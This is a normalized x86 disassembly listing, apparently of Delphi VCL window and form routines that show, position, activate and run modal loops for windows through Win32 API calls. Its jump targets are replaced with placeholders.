mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_4548bc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4371b0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4548b0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4371f4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4548ec
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4371b0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4548bc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453578
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_437a0c
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_4548e0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4371f4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4548b0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_451480
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_451480
jmp r-xdata
sub_45347d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_456e4c
call sub_403a84
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4521d0
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b4c4
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43df6c
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453578
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43df6c
call sub_44de2c
mov ebx eax
sub_4535c4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_45361c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d7e4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45367a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403294
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_453688
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403490
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4536b4
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_456e38
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403490
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_453854
jmp r-xdata
mov eax ebx
call sub_4538f0
mov dl 0x1
mov eax ebx
call sub_451440
jmp r-xdata
sub_453758
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_450dcc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_450e18
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_4537bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_40371c#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403490
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4538f0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_453874
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4538e2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4538e9
lea eax [ ebp - 0x4 ]
call sub_404050
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4520cc
sub_45390c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453bd4
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43600c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_455dac
xor edx edx
push ebp
push sub_453bb7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_4141ec
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_454ddc
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_44dcdc
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_453b95
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_45385c
xor edx edx
push ebp
push sub_453af4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4537bc
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_456bb8
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_43df6c
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453afb
mov eax [ ebp - 0x4 ]
call sub_453854
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_453afb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453b9f
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_454ddc
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_454ddc
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_414168
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_41430c
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44dd90
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_453be4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43ac9c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_453be4
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43ac60
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_453c54
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_453be4
pop ecx
mov eax [ esi + 0x34 ]
call sub_44911c
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_44912c
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_453cd8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c2bc
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403490
sub_453cfc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403490
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_453d2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43ac9c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_453cfc
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_453d2c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43ac60
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453da8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_453cfc
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_453cfc
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_453d2c
pop ecx
test al al
je r-xdata
sub_453dfc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403490
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_453e2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43ac9c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_453dfc
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_453e2c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43ac60
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453ea8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_453dfc
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_453dfc
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_453e2c
pop ecx
test al al
je r-xdata
sub_453efc
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_414170
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_443804
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_453f50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_453efc
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403490
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453fcc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41b0d4
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_454008
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_437c90
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_438978
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_454050
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_43e270
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_43df6c
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_43df6c
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_43df6c
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_43df6c
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_43df6c
push eax
call RedrawWindow
sub_4541a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_44ef54
mov dl 0x5
mov eax ebx
call sub_450cc8
mov dl 0x1
mov eax ebx
call sub_43cb48
mov dl 0x3
mov eax ebx
call sub_450fc4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_45420c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4542e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43ca08
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43c874
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_436cc0
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_437720
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404140
mov eax [ ebp - 0xc ]
call sub_404310
push eax
mov eax [ ebp - 0xc ]
call sub_404510
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_437730
mov eax [ ebp - 0xc ]
call sub_404310
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4542ea
lea eax [ ebp - 0xc ]
call sub_404050
retn
mov dl 0x1
mov eax esi
call sub_450348
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4377dc
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_40469c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_454310
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_43ac9c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_44fa6c
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_43ac60
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403490
inc ebp
dec edi
jne r-xdata
sub_45435c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_43ca08
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_454388
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d210
